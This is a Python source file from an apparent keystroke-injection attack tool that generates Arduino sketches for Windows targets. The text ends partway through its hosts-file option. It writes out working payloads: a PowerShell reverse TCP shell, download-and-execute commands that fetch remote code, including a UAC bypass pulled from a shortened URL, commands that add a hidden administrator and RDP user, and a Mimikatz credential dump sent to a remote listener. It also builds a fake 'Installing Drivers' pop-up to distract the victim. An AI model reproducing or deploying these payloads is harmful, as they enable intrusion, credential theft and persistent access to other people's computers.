#!/usr/bin/python
#uses HID-Project.h from https://github.com/NicoHood/HID, can be installed from Arduino Library Manager

import sys
import argparse
import os
import subprocess
import coreUtils
import nfoCore
import requests

def WinBanner():

  coreUtils.clearScreen()
  print("********************************************************************************************")
  print("*                                                                                          *")
  print("*                                                                                          *")
  print("*                                     Windows Payloads                                     *")
  print("*     These Payloads are made mostly for Windows 7, 8.1 and 10, as most use Powershell     *")
  print("*                                                                                          *")
  print("********************************************************************************************")
  print("\n")

def WinMenu():

  menu = {}
  menu['1']="Download and Execute Binary for Windows" 
  menu['2']="Download and Execute Powershell for Windows"
  menu['3']="Execute Custom Powershell script for Windows"
  menu['4']="Reverse TCP CMD Powershell for Windows"
  menu['5']="Add Administrator and Enable RDP for Windows"
  menu['6']="Download and run Invoke-Mimikatz.ps1, Send output to Remote Server for Windows"
  menu['7']="Change DNS Entry in Hostfile for Windows"
  menu['8']="Download File and Place on Current User's Desktop for Windows"
  menu['9']="Reverse TCP CMD prompt for Windows"
  menu['10']="windows/meterpreter/reverse_https in Powershell for Windows"
  menu['11']="Get username and computer name and send to a remote listener for Windows"
  menu['12']="Execute custom Command Prompt payload for Windows"

  menu['42']="Return to main menu"
  menu['99']="Exit"
  
  while True: 
    WinBanner()
    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    selection=input("\nPlease Select: ") 
    if selection =='1': 
      WinOption1() 
    elif selection == '2': 
      WinOption2()
    elif selection == '3':
      WinOption3()
    elif selection == '4':
      WinOption4()
    elif selection == '5':
      WinOption5()
    elif selection == '6':
      WinOption6()
    elif selection == '7':
      WinOption7()
    elif selection == '8':
      WinOption8()
    elif selection == '9':
      WinOption9()
    elif selection == '10':
	    WinOption10()
    elif selection == '11':
      WinOption11()
    elif selection == '12':
      WinOption12()
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
	  
def notificationBubble():

  title = "Installing Drivers"
  message = "Please do not remove the device"
  while True:

    answer = input("Do you want to include a notifiction bubble as a distraction? Press Enter for default bubble settings, Yes to customize (Y/n/?):  ")
    
    if answer in ('Y','y','yes','Yes','YES'):
    
      while True:
        print("\n")
        print("Current notification bubble title is: " + title)
        print("Current notification bubble message is: " + message)
        
        print("\n")
        customize = input("Do you want to change the notification bubble text? (Y/n): ")
        
        if customize in ('Y','y','yes','Yes','YES',''):
          print("\n")
          title = input("Please enter the Title of the notification bubble ->  ")
          message = input("Please enter the Message of the notification bubble ->  ")
        
        elif customize in ('N','n','no','No','NO',''):
      
          buffer = "void bubblePopup(){\n"
          buffer += "  Keyboard.println(\"wlrmdr.exe -s 60000 -f 1 -t \\\""+title+"\\\" -m \\\""+message+"\\\"\");\n"
          buffer += "  delay(100);\n"
          buffer += "  pressEnter();\n"
          buffer += "  delay(750);\n"
          buffer += "}\n"
        
          setting = 'Enabled'
          
          return buffer, setting
         
      break
    
    elif answer in ('N','n','no','No','NO'):
      buffer = "void bubblePopup(){\n"
      buffer += "}\n"
    
      setting = 'Disabled'
      return buffer, setting
      
    elif answer == '?':
      nfoCore.bubbleInfo()
    else:
      print("\nThat is not a valid option, enabling the default option Notification Bubble")
      buffer = "void bubblePopup(){\n"
      buffer += "  Keyboard.println(\"wlrmdr.exe -s 60000 -f 1 -t \\\"Installing Drivers\\\" -m \\\"Please do not remove the device\\\"\");\n"
      buffer += "  pressEnter();\n"
      buffer += "  delay(750);\n"
      buffer += "}\n"

      setting = 'Enabled'
      
      return buffer, setting
           
  
def checkUACBypass():

  while True:

    bypassUACoption = input("Please select a bypass UAC method:\n 1.  No UAC Bypass\n 2.  https://goo.gl/fPl4tm for bypass(no UAC popup)\n 3.  run As (UAC popup visable)\n ?.  For more information\n Press Enter for default (None): ")

    if bypassUACoption == "":
      bypassUACoption = "1"
      bypassUAC = noBypass()
      bypassType = "None"
      return bypassType,bypassUAC
    elif bypassUACoption == "1":
      bypassUAC = noBypass()
      bypassType = "None"
      return bypassType,bypassUAC
    elif bypassUACoption == "2":
      bypassUAC = BypassUACExploit()
      bypassType = "https://goo.gl/fPl4tm (no visible popup)"
      return bypassType,bypassUAC
    elif bypassUACoption == "3":
      bypassUAC = BypassUACAdmin()
      bypassType = "run As (visible popup)"
      return bypassType,bypassUAC
    elif bypassUACoption == '?':
      nfoCore.UACBypassInfo()
    else:
      print("That is not a valid option, giving you the default option of None")
      bypassUAC = noBypass()
      bypassType = "None"
      input("\nPress Enter to return to the previous Menu...")
      return bypassType,bypassUAC
	
def noUAVBypass():

  buffer ="void bypassUAC(){\n"
  buffer +=" \n"
  buffer +="}\n"
	
def BypassUACExploit():

  buffer = "void bypassUAC(){\n"
  buffer +="   Keyboard.press(KEY_LEFT_GUI);\n"
  buffer +="   Keyboard.press('r');\n"
  buffer +="   delay(200);\n"
  buffer += "  Keyboard.release(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.release('r');\n"
  buffer +="   Keyboard.println(\"cmd.exe /T:01 /K mode CON: COLS=15 LINES=1 && title Installing Drivers\");\n"
  buffer +="   delay(1000);\n"
  buffer +="   pressEnter();\n"
  buffer +="   Keyboard.println(\"powershell -NoP -NonI -W Hidden -Exec Bypass \\\"IEX (New-Object System.Net.WebClient).DownloadString(\'https://goo.gl/fPl4tm\');Bypass-UAC -Method ucmDismMethod;\\\"\");\n"
  buffer +="   pressEnter();\n"
  buffer +="   delay(1750);\n"
  buffer +="}\n"

  return(buffer)

def noBypass():

  buffer = "void bypassUAC(){\n"
  buffer += "  Keyboard.press(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.press('r');\n"
  buffer += "  delay(200);\n"
  buffer += "  Keyboard.release(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.release('r');\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.println(\"cmd.exe /T:01 /K mode CON: COLS=15 LINES=1 && title Installing Drivers\");\n"
  buffer += "  delay(100);\n"
  buffer += "  pressEnter();\n"
  buffer += "  delay(500);\n"
  buffer += "}\n"

  return(buffer)

def BypassUACAdmin():

  buffer = "void bypassUAC(){\n"
  buffer += "  Keyboard.press(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.press('r');\n"
  buffer += "  delay(200);\n"
  buffer += "  Keyboard.release(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.release('r');\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.println(\"powershell Start-Process cmd.exe -Verb runAs\");\n"
  buffer += "  delay(100);\n"
  buffer += "  pressEnter();\n"
  buffer += "  delay(1000);\n"
  buffer += "\n"
  buffer += "  Keyboard.press(KEY_LEFT_ALT);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.println(\"Y\");\n"
  buffer += "  Keyboard.release(KEY_LEFT_ALT);\n"
  buffer += "  delay(500);\n"
  buffer += "\n"
  buffer += "  Keyboard.println(\"cmd.exe /T:01 /K mode CON: COLS=15 LINES=1 && title Installing Drivers\");\n"
  buffer += "  delay(100);\n"
  buffer += "  pressEnter();\n"
  buffer += "  delay(200);\n"
  buffer += "}\n"

  return (buffer)

def WinWriteFile(fileName,payloadFunc,bypassUAC,payload, bubble):

  buffer = "//This Arduino Sketch was generated with the OverThruster tool, located here: https://github.com/RedLectroid/OverThruster\n\n"
  buffer += "#include <HID-Project.h>\n"
  buffer += "void setup() {\n"
  buffer += "  Keyboard.begin();\n"
  buffer += "  hurryUp();\n"
  buffer += "  killCaps();\n"
  buffer += "  bypassUAC();\n"
  buffer += "  bubblePopup();\n"
  buffer += "  //THIS DELAY IS IMPORTANT, AND MAY NEED TO BE MODIFIED FOR YOUR TARGET\n"
  buffer += "  delay(1000);\n"

  buffer += "  " + payloadFunc

  buffer += "  Keyboard.end();\n"
  buffer += "}\n"

  buffer += "void pressEnter(){\n"
  buffer += "  Keyboard.press(KEY_RETURN);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.release(KEY_RETURN);\n"
  buffer += "}\n"

  buffer += "void hurryUp(){\n"
  buffer += "  boolean areWeThereYet = capsCheck();\n"
  buffer += "  while (areWeThereYet == capsCheck()){\n"
  buffer += "    hitCaps();\n"
  buffer += "  }\n"
  buffer += "  hitCaps();\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "boolean capsCheck(){\n"
  buffer += "  if (BootKeyboard.getLeds() & LED_CAPS_LOCK){\n"
  buffer += "    return true;\n"
  buffer += "  }\n"
  buffer += "  else{\n"
  buffer += "    return false;\n"
  buffer += "  }\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "void hitCaps(){\n"
  buffer += "  Keyboard.press(KEY_CAPS_LOCK);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.release(KEY_CAPS_LOCK);\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "void killCaps(){\n"
  buffer += "  if (capsCheck())\n"
  buffer += "  {\n"
  buffer += "      hitCaps();\n"
  buffer += "  }\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += bypassUAC
  
  buffer += bubble
  
  buffer += payload

  buffer += "void loop()\n"
  buffer += "{\n"
  buffer += "}\n"

  fileName = coreUtils.checkINO(fileName)
  file = open(fileName,'w')
  file.write(buffer)
  file.close()

  print("\n\noutput written to " + fileName)
  input("\nPress Enter to continue and return to Main Menu...")
  coreUtils.clearScreen()


def uploadToPastebin(key,code):
    # default expire to 1month
    params = {'api_dev_key':key, 'api_paste_private':'1','api_option':'paste', 'api_paste_expire_date':'1M','api_paste_code':code}
    req = requests.post("https://pastebin.com/api/api_post.php", data=params)

    pastebinUrl = req.text.replace('pastebin.com/','pastebin.com/raw/')
    return pastebinUrl\

def WinOption1():

  done = False
  looper = False
  URL=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:

    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                       Download and Execute Binary for Windows                            *")
    print("*    This payload will download a binary and execute it, then close the powershell prompt  *")
    print("*  Options are: 1. The URL 2. The binary name 3. How to bypass UAC 4. The output File name *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set URL of the binary to download and execute"
    menu['2'] = "Set bypassUAC mode"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Set notification bubble option"
    menu['5'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if URL != "":
      print("URL of binary set to ->  " + URL)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      URL = input("Please enter the full URL of the binary (please include \"http://\" or \"https://\"): ")
      binary = coreUtils.getBinary(URL)
    elif selection == '2': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '3':
      fileName = coreUtils.getFileName('dropBinary.ino')
    elif selection == '4':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '5':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win1info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if URL != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  
    payload = "void downBinary(){\n"
    if bypassUACoption != "https://goo.gl/fPl4tm (no visible popup)":
      payload += "  Keyboard.println(\"cd\\\\users\\\\%USERNAME%\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload += "  Keyboard.println(\"powershell -w hidden \\\"$source = '" +URL+ "\'; $destination = '" +binary+  "'; Invoke-WebRequest $source -OutFile $destination;start-process '" +binary+"';exit;\\\"\");\n"
    else:
      payload += "  Keyboard.println(\"powershell -w hidden \\\"$source = '" +URL+ "\'; $destination = '" +binary+  "'; Invoke-WebRequest $source -OutFile $destination;start-process '" +binary+"';exit;\\\"\");\n"
    payload += "  delay(100);\n"
    payload += "  pressEnter();\n"

    
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"
    

    payloadFunc = "downBinary();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble)
	



def WinOption2():

  done = False
  looper = False
  URL=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                      Download and Execute Powershell for Windows                         *")
    print("*                This payload will download a powershell script then run it                *")
    print("*  Options are: 1. The URL 2. The script name 3. How to bypass UAC 4. The output File name *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set URL of the powershell script to download and execute"
    menu['2'] = "Set bypassUAC mode"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Set notification bubble option"
    menu['5'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in sorted(options):
    for entry in options: 
      print(entry, menu[entry])

    print("\n\n")
    if URL != "":
      print("URL of Powershell script set to ->  " + URL)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      URL = input("Please enter the full URL of the Powershell script (please include \"http://\" or \"https://\"): ")
      scriptName = coreUtils.getBinary(URL)
    elif selection == '2': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '3':
      fileName = coreUtils.getFileName('downPSH.ino')
    elif selection == '4':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '5':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win2info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if URL != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  

    payload = "void downExecPSH(){\n"
    payload += "  Keyboard.println(\"powershell -w hidden \\\"IEX (New-Object Net.WebClient).DownloadString(\'" +URL+ "\');" + scriptName + ";exit;\\\"\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "downExecPSH();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble)

def WinOption3():

  done = False
  looper = False
  powershell = ""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""
  
  while looper != True:

    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                     Execute Custom Powershell script for Windows                         *")
    print("*                    This payload will run custom powershell script                        *")
    print("*               Options are: 1. Powershell code 2. The output File name                    *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set powershell script to execute"
    menu['2'] = "Set bypassUAC mode"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Set notification bubble option"
    menu['5'] = "Write Arduino sketch"
    menu['6'] = "Display powershell script"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if powershell != "":
      print("powershell script is set")
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      powershell = input("\"powershell -nop -w hidden\" will automatically be added to the payload\nPlease add \"-enc\" at the beginning if your script is fully encoded\nPlease input your powershell script: ")
      powershell = coreUtils.checkQuotes(powershell)
    elif selection == '2': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '3':
      fileName = coreUtils.getFileName('powershell.ino')
    elif selection == '4':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '5':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '6':
      if powershell == "":
        print("you have not entered a powershell script yet")
        input("Please press enter to continue")
        coreUtils.clearScreen()
      else:
        print("Powershell script set as -> " +powershell)
        input("Please press enter to continue")
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win3info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if powershell != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
  
  if done == True and looper == True:  

    payload = "void powershell(){\n"
    payload += "  Keyboard.println(\"powershell -nop -w hidden " + powershell + "\");\n"
    payload += "  pressEnter();\n"
    payload += "  Keyboard.println(\"exit\");\n"
    payload += "  delay(100);\n"
    payload += "  pressEnter();\n"
    payload += "}\n"

    payloadFunc = "powershell();\n"


    WinWriteFile(fileName, payloadFunc,bypassUAC,payload,bubble)

def WinOption4():

  done = False
  looper = False
  remoteIP=""
  remotePort = ""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:

    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                      Reverse TCP CMD in Powershell for Windows                           *")
    print("*          This payload will create a Reverse TCP CMD Prompt via Powershell                *")
    print("*         Options are: 1. The IP 2. The listening port 3. The output File name             *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set the remote IP of the listening server"
    menu['2'] = "Set the remote Port of the listening server"
    menu['3'] = "Set bypassUAC mode"
    menu['4'] = "Set Arduino sketch filename"
    menu['5'] = "Set notification bubble option"
    menu['6'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])
    print("\n\n")
    if remoteIP != "":
      print("IP of the remote server is set to ->  " + remoteIP)
    if remotePort != "":
      print("The listening port of the remote server is ->  " + remotePort)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      remoteIP = input("Please enter the IP of the remote server: ")
    elif selection == '2':
      remotePort = input("Please enter the listening port of the remote server: ")
    elif selection == '3': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '4':
      fileName = coreUtils.getFileName('reverseTCP.ino')
    elif selection == '5':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '6':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win4info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True

  if done == True and looper == True:  
    payload = "void reverseTCP(){\n"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
        payload += "  Keyboard.println(\"$client = New-Object System.Net.Sockets.TCPClient('" + remoteIP + "'," + remotePort + ");$stream = $client.GetStream();"
    else:
      payload += "  Keyboard.println(\"powershell -w Hidden \\\"$client = New-Object System.Net.Sockets.TCPClient('" + remoteIP + "'," + remotePort + ");$stream = $client.GetStream();"
    payload += "[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
    payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload += "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\");\n"
    else:
      payload += "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\\\"\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "reverseTCP();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC, payload,bubble)


def WinOption5():

  done = False
  looper = False
  userName=""
  userPass=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                     Add Administrator and Enable RDP for Windows                         *")
    print("* This payload will add a user, then add the user to the Administrator Group and RDP Group *")
    print("*     Options are: 1. UserName 2. Password 3. How to bypass UAC 4. The output File name    *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set username to add"
    menu['2'] = "Set username password"
    menu['3'] = "Set bypassUAC mode"
    menu['4'] = "Set Arduino sketch filename"
    menu['5'] = "Set notification bubble option"
    menu['6'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if userName != "":
      print("username set to ->  " + userName)
    if userPass != "":
      print("user password set to ->  " + userPass)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      userName = input("Please enter the username to add to the admin group: ")
    elif selection == '2':
      userPass = input("Please enter the password for the new user: ")
    elif selection == '3': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '4':
      fileName = coreUtils.getFileName('addAdmin.ino')
    elif selection == '5':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '6':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win5info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if userName != "" and userPass != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  
    payload = "void addUser(){\n"
    payload += "  Keyboard.println(\"net user " + userName + " " + userPass + " /add \");\n"
    payload += "  pressEnter();\n"
    payload += "  delay(100);\n"
    payload += "  Keyboard.println(\"net localgroup administrators " + userName + " /add\");\n"
    payload += "  pressEnter();\n"
    payload += "  Keyboard.println(\"net localgroup \\\"remote desktop users\\\" " + userName + " /add\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    else:
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "addUser();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble) 

def WinOption6():

  done = False
  looper = False
  mimiURL=""
  remoteIP=""
  remotePort=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                         Download & Run Invoke-Mimikatz.ps1                               *")
    print("*  This payload will download & run Invoke-Mimikatz.ps1 then send output to remote server  *")
    print("*         Options are: 1. The mimikatz URL 2. remote IP 3. Listening Port                  *")
    print("*                 4. How to bypass UAC 5. The output File name                             *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set the URL Invoke-Mimikatz.ps1 is located"
    menu['2'] = "Set the IP of the remote server"
    menu['3'] = "Set the listening port of the remote server"
    menu['4'] = "Set bypassUAC mode"
    menu['5'] = "Set Arduino sketch filename"
    menu['6'] = "Set notification bubble option"
    menu['7'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if mimiURL != "":
      print("URL of Invoke-Mimikatz.ps1 set to ->  " + mimiURL)
    if remoteIP != "":
      print("The IP of the remote server is set to ->  " + remoteIP)
    if remotePort != "":
      print("The listening port of the remote server is set to ->  " + remotePort)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      mimiURL = input("Please enter the full URL where Invoke-Mimikatz.ps1 is located (Please include \"http://\" or \"https://\")\nIf left blank, the default https://goo.gl/KBCGCr will be used: ")
      if mimiURL == "":
        mimiURL = 'https://goo.gl/KBCGCr'
    elif selection == '2':
      remoteIP = input("Please enter the IP of the server to send the Mimikatz to: ")
    elif selection == '3':
      remotePort = input("Please enter the port the server will be listening on: ")
    elif selection == '4': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '5':
      fileName = coreUtils.getFileName('remoteMimiKatz.ino')
    elif selection == '6':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '7':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win6info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if mimiURL != "" and remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  
    payload = "void invokeMimiKatz(){\n"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload += "  Keyboard.print(\"IEX (New-Object Net.WebClient).DownloadString(\'" + mimiURL + "\'); $port=" + remotePort +"; $remoteHost=\'"+ remoteIP 
    else:    
      payload += "  Keyboard.print(\"powershell -w Hidden \\\"IEX (New-Object Net.WebClient).DownloadString(\'" + mimiURL + "\'); $port=" + remotePort +"; $remoteHost=\'"+ remoteIP 
    payload += "\'; $Message = Invoke-Mimikatz -DumpCreds; $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port); $data = [System.Text.Encoding]::ASCII.GetBytes($Message);"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload += " $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;\");\n"
    else:
      payload += " $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;\\\"\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "invokeMimiKatz();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble) 

def WinOption7():

  done = False
  looper = False
  DNS=""
  remoteIP=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                            Change DNS Entry in Hostfile                                  *")
    print("*       This payload will modify the hostfile to include specific Domain/IP entry          *")
